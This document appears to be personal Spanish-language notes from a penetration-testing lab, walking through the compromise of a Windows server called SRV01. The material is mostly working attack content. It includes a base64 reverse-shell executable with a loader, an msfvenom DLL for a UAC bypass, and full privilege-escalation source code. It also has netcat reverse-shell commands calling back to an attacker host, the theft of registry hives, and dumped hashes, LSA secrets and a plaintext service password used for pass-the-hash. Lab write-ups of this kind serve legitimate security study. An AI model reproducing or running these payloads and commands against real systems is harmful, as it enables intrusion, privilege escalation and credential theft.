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 ' // (He acortado para el ejemplo)

// 1. Decodificamos a un array de bytes (esto mantiene la estructura del EXE intacta)
byte[] decodedBytes = Base64.getDecoder().decode(base64String.trim())

// 2. Definimos la ruta de salida
def outputPath = "C:\\Temp\\revv.exe"

// 3. Escribimos los BYTES directamente al archivo (SIN convertir a String)
def file = new File(outputPath)
file.setBytes(decodedBytes)

println "[+] EXE binario guardado correctamente en: " + outputPath
println "[+] Tamaño esperado: " + decodedBytes.length + " bytes"
```

![[Pasted image 20260122142540.png]]

shell system en srv01

```bash
ssh root@10.129.5.216 -i id_rsa_rootDMZ -R 172.16.139.10:4444:0.0.0.0:7000
```

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:7000 
[*] Sending stage (230982 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:7000 -> 127.0.0.1:58674) at 2026-01-22 12:25:41 -0500

meterpreter > getuid
Server username: SRV01\svc_liferay
meterpreter > upload FullPowers.exe
[*] Uploading  : /home/zs1n/Desktop/CPTS/FullPowers.exe -> FullPowers.exe
[*] Uploaded 36.00 KiB of 36.00 KiB (100.0%): /home/zs1n/Desktop/CPTS/FullPowers.exe -> FullPowers.exe
[*] Completed  : /home/zs1n/Desktop/CPTS/FullPowers.exe -> FullPowers.exe
```

UAC Bypass

```bash
PS C:\ProgramData> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1

PS C:\ProgramData> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5

PS C:\ProgramData> [environment]::OSVersion.Version
[environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      17763  0       


PS C:\ProgramData> cmd /c echo %PATH%
cmd /c echo %PATH%
C:\Program Files (x86)\Common Files\Oracle\Java\javapath;C:\Windows\system32;
C:\Windows;C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Windows\System32\OpenSSH\;C:\Users\svc_liferay\AppData\Local\Microsoft\WindowsApps

```

![[Pasted image 20260122150221.png]]
 genero dll
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.139.10 LPORT=4444 -f dll > srrstr.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes

```
subo dll

```powershell
pps\\srrstr.dllpload srrstr.dll C:\\Users\\svc_liferay\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll
 
[*] Uploading  : /home/zs1n/Desktop/CPTS/srrstr.dll -> C:\Users\svc_liferay\AppData\Local\Microsoft\WindowsApps\srrstr.dll
[*] Uploaded 9.00 KiB of 9.00 KiB (100.0%): /home/zs1n/Desktop/CPTS/srrstr.dll -> C:\Users\svc_liferay\AppData\Local\Microsoft\WindowsApps\srrstr.dll
[*] Completed  : /home/zs1n/Desktop/CPTS/srrstr.dll -> C:\Users\svc_liferay\AppData\Local\Microsoft\WindowsApps\srrstr.dll

```

disparo

```powershell
C:\ProgramData>rundll32 shell32.dll,Control_RunDLL C:\Users\svc_liferay\AppData\Local\Microsoft\WindowsApps\srrstr.dll
rundll32 shell32.dll,Control_RunDLL C:\Users\svc_liferay\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

listener conexion

```powershell
rlwrap -cAr nc -nlvp 7000
listening on [any] 7000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44232
Microsoft Windows [Version 10.0.17763.6893]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\ProgramData>whoami
whoami
srv01\svc_liferay

C:\ProgramData>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
```

![[Pasted image 20260122150742.png]]

```powershell
C:\ProgramData>tasklist /svc | findstr "rundll32"
tasklist /svc | findstr "rundll32"
rundll32.exe                  1820 N/A                                         

C:\ProgramData>taskkill /PID 1820 /F
taskkill /PID 1820 /F
SUCCESS: The process with PID 1820 has been terminated.
```

```bash
meterpreter > upload SharpUp.exe C:\\programdata\\SharpUp.exe
[*] Uploading  : /home/zs1n/Desktop/CPTS/SharpUp.exe -> C:\programdata\SharpUp.exe
[*] Uploaded 38.50 KiB of 38.50 KiB (100.0%): /home/zs1n/Desktop/CPTS/SharpUp.exe -> C:\programdata\SharpUp.exe
[*] Completed  : /home/zs1n/Desktop/CPTS/SharpUp.exe -> C:\programdata\SharpUp.exe
meterpreter > upload nssm.exe C:\\programdata\\nssm.exe
[*] Uploading  : /home/zs1n/Desktop/CPTS/nssm.exe -> C:\programdata\nssm.exe
[*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /home/zs1n/Desktop/CPTS/nssm.exe -> C:\programdata\nssm.exe
[*] Completed  : /home/zs1n/Desktop/CPTS/nssm.exe -> C:\programdata\nssm.exe

```


```powershell
PS C:\ProgramData> .\SharpUp.exe audit
.\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===
[!] Modifialbe scheduled tasks were not evaluated due to permissions.
[+] Hijackable DLL: C:\Liferay\liferay-ce-portal-7.4.3.43-ga43\tomcat-9.0.56\temp\sidecar7225912436888620023\jna-1773657295\jna3693490276010771814.dll
[+] Associated Process is java with PID 3388 

=== Unattended Install Files ===
        C:\Windows\Panther\Unattend.xml


=== Abusable Token Privileges ===
        SeTcbPrivilege: DISABLED


=== Modifiable Service Binaries ===
        Service 'Liferay' (State: Running, StartMode: Auto) : C:\Liferay\nssm.exe



[*] Completed Privesc Checks in 5 seconds

PS C:\ProgramData> icacls C:\Liferay\
icacls C:\Liferay\
C:\Liferay\ SRV01\svc_liferay:(OI)(CI)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(F)
            BUILTIN\Users:(I)(OI)(CI)(RX)
            BUILTIN\Users:(I)(CI)(AD)
            BUILTIN\Users:(I)(CI)(WD)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```


Hbailitando setcbpruiilvege

https://gist.githubusercontent.com/anzz1/506ddfb17173e14709cba38dbd576f22/raw/0bfbd26e4651c7c708974fe2c959679625e1ef77/Enable-Privilege.ps1

```powershell
PS C:\programdata> .\EnableAllTokenPrivs.ps1
.\EnableAllTokenPrivs.ps1
.\EnableAllTokenPrivs.ps1 : The term '.\EnableAllTokenPrivs.ps1' is not recognized as the name of a cmdlet, function, 
script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is 
correct and try again.
At line:1 char:1
+ .\EnableAllTokenPrivs.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (.\EnableAllTokenPrivs.ps1:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 
PS C:\programdata> .\EnablePrivilege.ps1
.\EnablePrivilege.ps1

 *** Enable-Privilege.ps1 ***


NAME
    Enable-Privilege
    
SYNOPSIS
    Enables or disables security privileges on a target process.
    
    
SYNTAX
    Enable-Privilege [-Privilege] <String[]> [[-ProcessID] <Int32>] [-Disable] [-Force] [-WhatIf] [-Confirm] 
    [<CommonParameters>]
    
    
DESCRIPTION
    Enables or disables security privileges on a target process.
    Multiple privileges can be set at once, separated by a comma.
    

PARAMETERS
    -Privilege <String[]>
        Privileges to enable or disable on a target process, e.g. SeBackupPrivilege, SeRestorePrivilege.
        Alias: -Priv
        
    -ProcessID <Int32>
        Target process ID. Special values: -1 (current) and -2 (parent). Default: -1 (current process)
        Alias: -PID
        
    -Disable [<SwitchParameter>]
        Disable privileges.
        
    -Force [<SwitchParameter>]
        
    -WhatIf [<SwitchParameter>]
        
    -Confirm [<SwitchParameter>]
        
    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see 
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216). 
    
REMARKS
    To see the examples, type: "get-help Enable-Privilege -examples".
    For more information, type: "get-help Enable-Privilege -detailed".
    For technical information, type: "get-help Enable-Privilege -full".
    For online help, type: "get-help Enable-Privilege -online"


PS C:\programdata> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
PS C:\programdata> .\EnablePrivilege.ps1 -Priv SeTcbPrivilege
.\EnablePrivilege.ps1 -Priv SeTcbPrivilege
[Enable-Privilege] 1 privileges enabled successfully. (Target: powershell.exe PID: 2444)
PS C:\programdata> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
```


compilacion de tcbeleveation.cpp

```cpp
// TcbElevation - Authors: @splinter_code and @decoder_it

#define SECURITY_WIN32
#define UNICODE 1
#define _UNICODE 1
#include <windows.h>
#include <sspi.h>
#include <stdio.h>

#pragma comment(lib, "Secur32.lib")

void EnableTcbPrivilege(BOOL enforceCheck);
BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege);
SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(LPWSTR pszPrincipal, LPWSTR pszPackage, unsigned long fCredentialUse, void* pvLogonId, void* pAuthData, SEC_GET_KEY_FN pGetKeyFn, void* pvGetKeyArgument, PCredHandle phCredential, PTimeStamp ptsExpiry);

int wmain(int argc, wchar_t** argv)
{

    if (argc < 3) {
        printf("usage: TcbElevation.exe [ServiceName] [CmdLine]\n");
        exit(-1);
    }

    EnableTcbPrivilege(TRUE);
    PSecurityFunctionTableW table = InitSecurityInterfaceW();
    table->AcquireCredentialsHandleW = AcquireCredentialsHandleWHook; // SSPI hooks trick borrowed from @tiraniddo --> https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82
    
    wchar_t* serviceName = argv[1];
    wchar_t* cmdline = argv[2];

    SC_HANDLE hScm = OpenSCManagerW(L"127.0.0.1", nullptr, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!hScm)
    {
        printf("Error opening SCM %d\n", GetLastError());
        return 1;
    }

    SC_HANDLE hService = CreateService(hScm, serviceName, nullptr, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, cmdline, nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!hService)
    {
        printf("Error creating service %d\n", GetLastError());
        return 1;
    }

    if (!StartService(hService, 0, nullptr))
    {
        printf("Error starting service %d\n", GetLastError());
        return 1;
    }

    return 0;
}

BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    PRIVILEGE_SET privs;
    LUID luid;
    BOOL debugPrivEnabled = FALSE;
    if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid))
    {
        printf("LookupPrivilegeValueW() failed, error %u\n", GetLastError());
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges() failed, error %u\n", GetLastError());
        return FALSE;
    }
    privs.PrivilegeCount = 1;
    privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privs.Privilege[0].Luid = luid;
    privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!PrivilegeCheck(hToken, &privs, &debugPrivEnabled)) {
        printf("PrivilegeCheck() failed, error %u\n", GetLastError());
        return FALSE;
    }
    if (!debugPrivEnabled)
        return FALSE;
    return TRUE;
}

void EnableTcbPrivilege(BOOL enforceCheck) {
    HANDLE currentProcessToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
    BOOL setPrivilegeSuccess = SetPrivilege(currentProcessToken, (wchar_t*)L"SeTcbPrivilege", TRUE);
    if (enforceCheck && !setPrivilegeSuccess) {
        printf("No SeTcbPrivilege in the token. Exiting...\n");
        exit(-1);
    }
    CloseHandle(currentProcessToken);
}

SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(LPWSTR pszPrincipal, LPWSTR pszPackage, unsigned long fCredentialUse, void* pvLogonId, void* pAuthData, SEC_GET_KEY_FN pGetKeyFn, void* pvGetKeyArgument, PCredHandle phCredential, PTimeStamp ptsExpiry)
{
    LUID logonId;
    ZeroMemory(&logonId, sizeof(LUID));
    logonId.LowPart = 0x3E7; // here we do the Tcb magic using the SYSTEM LUID in pvLogonId of AcquireCredentialsHandleW call
    return AcquireCredentialsHandleW(pszPrincipal, pszPackage, fCredentialUse, &logonId, pAuthData, pGetKeyFn, pvGetKeyArgument, phCredential, ptsExpiry);
}

```


```bash
x86_64-w64-mingw32-g++ -o TcbElevation.exe TcbElevation.cpp -static -ladvapi32 -lsecur32 -lkernel32 -DUNICODE -D_UNICODE -municode
```

```powershell
meterpreter > upload TcbElevation.exe C:\\programdata\\TcbElevation.exe
[*] Uploading  : /home/zs1n/Desktop/CPTS/TcbElevation.exe -> C:\programdata\TcbElevation.exe
[*] Uploaded 254.71 KiB of 254.71 KiB (100.0%): /home/zs1n/Desktop/CPTS/TcbElevation.exe -> C:\programdata\TcbElevation.exe
[*] Completed  : /home/zs1n/Desktop/CPTS/TcbElevation.exe -> C:\programdata\TcbElevation.exe
```

![[Pasted image 20260122172555.png]]

```powershell
PS C:\ProgramData> .\TcbElevation.exe
.\TcbElevation.exe
usage: TcbElevation.exe [ServiceName] [CmdLine]
PS C:\ProgramData> .\TcbElevation.exe noexistentservivce "C:\Temp\nc.exe 172.16.139.10 4444 -e cmd"
.\TcbElevation.exe noexistentservivce "C:\Temp\nc.exe 172.16.139.10 4444 -e cmd"
Error starting service 1053
```

```powershell
rlwrap -cAr nc -nlvp 7000
listening on [any] 7000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55278
Microsoft Windows [Version 10.0.17763.6893]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

![[Pasted image 20260122172448.png]]

```powershell
C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
b36b68951e8f84bd1c135da30b25c581
```

backups

```powershell
meterpreter > download security.bak
[*] Downloading: security.bak -> /home/zs1n/Desktop/CPTS/security.bak
[*] Downloaded 36.00 KiB of 36.00 KiB (100.0%): security.bak -> /home/zs1n/Desktop/CPTS/security.bak
[*] Completed  : security.bak -> /home/zs1n/Desktop/CPTS/security.bak
meterpreter > download system.bak
[*] Downloading: system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 1.00 MiB of 16.75 MiB (5.97%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 2.00 MiB of 16.75 MiB (11.94%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 3.00 MiB of 16.75 MiB (17.91%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 4.00 MiB of 16.75 MiB (23.88%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 5.00 MiB of 16.75 MiB (29.84%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 6.00 MiB of 16.75 MiB (35.81%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 7.00 MiB of 16.75 MiB (41.78%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 8.00 MiB of 16.75 MiB (47.75%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 9.00 MiB of 16.75 MiB (53.72%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 10.00 MiB of 16.75 MiB (59.69%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 11.00 MiB of 16.75 MiB (65.66%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 12.00 MiB of 16.75 MiB (71.63%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 13.00 MiB of 16.75 MiB (77.59%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 14.00 MiB of 16.75 MiB (83.56%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 15.00 MiB of 16.75 MiB (89.53%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 16.00 MiB of 16.75 MiB (95.5%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Downloaded 16.75 MiB of 16.75 MiB (100.0%): system.bak -> /home/zs1n/Desktop/CPTS/system.bak
[*] Completed  : system.bak -> /home/zs1n/Desktop/CPTS/system.bak
meterpreter > download security.bak
[*] Downloading: security.bak -> /home/zs1n/Desktop/CPTS/security.bak
[*] Skipped    : security.bak -> /home/zs1n/Desktop/CPTS/security.bak
meterpreter > download sam.bak
[*] Downloading: sam.bak -> /home/zs1n/Desktop/CPTS/sam.bak
[*] Downloaded 52.00 KiB of 52.00 KiB (100.0%): sam.bak -> /home/zs1n/Desktop/CPTS/sam.bak
[*] Completed  : sam.bak -> /home/zs1n/Desktop/CPTS/sam.bak
```

![[Pasted image 20260122185747.png]]


```bash
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x7fda9b9d87583b021befe4ea614afed0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9cc7e0d2bcd1b87a2823ec664a661113:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
svc_liferay:1002:aad3b435b51404eeaad3b435b51404ee:c4c84ac54ac6d31b6e8fce1d097f4a98:::
rhinkle:1003:aad3b435b51404eeaad3b435b51404ee:3af49a2a1d29a090b9f75a885ae86cc8:::
backup_svc:1004:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Dumping cached domain logon information (domain/username:hash)
AD.TRILOCOR.LOCAL/Administrator:$DCC2$10240#Administrator#64e2f5f3632bcb0f233e371b9ea6aba3: (2025-02-18 18:57:05+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:07d78a0f8b73d65cc5f9d8d7ee82311457b293a1c28cbc1f5d4315d0edf036f249fa91a2c6b9df1301e027430aa87775b668c7de33af977f6050e3c373a695eede9088e7fb2db0038acfa12d54d604c16076f06ad753ac2d08189c5ba9e890c98f59a04bb327288e462c6a390f60f427444dc752b86dccc1ccbf7477fef71539ae1c1dd126f339fed5313d107154930961d457e479d6acd8c402c4f15738effb0e23baa54ee4d8daac299133a51943c5a163f7f310725796b06cd229f7d43ad2ccdc27610542dd82adeaa0a08edda80f9c7c137a2055570f48ab3bd3349f14cabf0d70cf81eb68a96a96bfbaa2c7f408
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:ce9bcba494b86e3340b2e457d2a78aed
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb5e34da2d073f50239f822463c615dfcdc66e36a
dpapi_userkey:0x51f29c425b7dbea59fbee474e2a4f6566448d74a
[*] NL$KM 
 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
[*] _SC_Liferay 
(Unknown User):RnD0mPAssw0rdSup3rS3crET123
[*] Cleaning up...
```

![[Pasted image 20260122185855.png]]

![[Pasted image 20260122200831.png]]

```bash
proxychains nxc smb 172.16.139.35 --local-auth -u Administrator -H '9cc7e0d2bcd1b87a2823ec664a661113' 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:135  ...  OK
SMB         172.16.139.35   445    SRV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV01) (domain:SRV01) (signing:False) (SMBv1:None)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:445  ...  OK
SMB         172.16.139.35   445    SRV01            [+] SRV01\Administrator:9cc7e0d2bcd1b87a2823ec664a661113 (Pwn3d!)
```

```bash
proxychains nxc smb 172.16.139.35 --local-auth -u Administrator -H '9cc7e0d2bcd1b87a2823ec664a661113' --lsa 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:135  ...  OK
SMB         172.16.139.35   445    SRV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV01) (domain:SRV01) (signing:False) (SMBv1:None)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:445  ...  OK
SMB         172.16.139.35   445    SRV01            [+] SRV01\Administrator:9cc7e0d2bcd1b87a2823ec664a661113 (Pwn3d!)
SMB         172.16.139.35   445    SRV01            [*] Dumping LSA secrets
SMB         172.16.139.35   445    SRV01            AD.TRILOCOR.LOCAL/Administrator:$DCC2$10240#Administrator#64e2f5f3632bcb0f233e371b9ea6aba3: (2025-02-18 18:57:05)
SMB         172.16.139.35   445    SRV01            trilocor\SRV01$:aes256-cts-hmac-sha1-96:62932ff42d82d342201dd001d59814983ae3aa05469c26215ced3250331eb801
SMB         172.16.139.35   445    SRV01            trilocor\SRV01$:aes128-cts-hmac-sha1-96:e68f7a53c4012b424c70d9b04c6beb10
SMB         172.16.139.35   445    SRV01            trilocor\SRV01$:des-cbc-md5:3832c4315d0edc2f
